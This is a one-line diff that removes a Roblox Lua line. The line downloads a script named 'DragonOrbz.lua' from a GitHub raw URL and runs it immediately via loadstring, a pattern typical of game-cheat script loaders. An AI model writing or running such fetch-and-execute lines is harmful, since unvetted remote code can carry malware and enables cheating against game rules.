@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gha-lol/scripts/main/DragonOrbz.lua"))()
